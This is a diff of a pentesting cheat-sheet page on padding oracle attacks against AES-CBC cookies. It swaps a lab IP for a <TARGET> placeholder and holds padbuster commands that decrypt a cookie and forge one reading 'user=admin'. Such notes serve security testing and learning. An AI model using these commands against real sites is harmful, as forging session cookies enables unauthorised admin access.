@@ -4,7 +4,6 @@ date: 2024-6-27
 tags: ["padding oracle", "padbuster", "aes", "cbc", "cipher", "encryption"]
 ---
 
----
 ### Tools
 
 {{< tab set1 tab1 active >}}padbuster{{< /tab >}}
@@ -12,15 +11,15 @@ tags: ["padding oracle", "padbuster", "aes", "cbc", "cipher", "encryption"]
 
 <div>
 
-```bash
+```console
 # 8 or 16     : block size
 # encoding 0  : base64
-padbuster http://10.10.11.10/index.php <COOKIE_VALUE> 8 -cookies <COOKIE_NAME>=<COOKIE_VALUE> -encoding 0
+padbuster http://<TARGET>/index.php <COOKIE_VALUE> 8 -cookies <COOKIE_NAME>=<COOKIE_VALUE> -encoding 0
 ```
 
-```bash
+```console
 # Forge cookie value, e.g. user=admin
-padbuster http://10.10.11.10/index.php <COOKIE_VALUE> 8 -cookies <COOKIE_NAME>=<COOKIE_VALUE> -encoding 0 -plaintext user=admin
+padbuster http://<TARGET>/index.php <COOKIE_VALUE> 8 -cookies <COOKIE_NAME>=<COOKIE_VALUE> -encoding 0 -plaintext user=admin
 ```
 
 </div>
